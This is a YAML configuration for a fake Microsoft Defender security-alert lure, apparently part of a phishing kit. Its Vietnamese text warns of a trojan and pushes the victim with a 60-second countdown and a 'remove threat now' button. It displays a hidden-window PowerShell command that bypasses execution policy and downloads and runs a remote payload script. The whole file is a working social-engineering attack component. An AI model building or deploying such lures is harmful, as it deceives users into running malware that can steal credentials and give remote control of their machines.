# Security Alert Lure
# Mimics Microsoft Defender "Critical Threat Detected" warning

type: alert
template: lures/security_alert.html
route: /canh-bao-bao-mat

payload:
  script: "default.js"

content:
  title: "Phát Hiện Mối Đe Dọa Nghiêm Trọng"
  threat_name: "Trojan:Win32/Wacatac.B!ml"
  threat_detail: >
    Phát hiện trong bộ nhớ hệ thống. Mối đe dọa này có thể đánh cắp thông tin đăng nhập,
    truy cập tệp tin và kiểm soát từ xa thiết bị của bạn.
  button_text: "Xóa Mối Đe Dọa Ngay"
  countdown: 60
  display_command: "powershell -w h -ep bypass -c \"IEX (iwr 'http://localhost:8080/api/payloads/default.ps1' -UseBasicParsing).Content\""

styles:
  theme: "defender"
  primary_color: "#c81c00"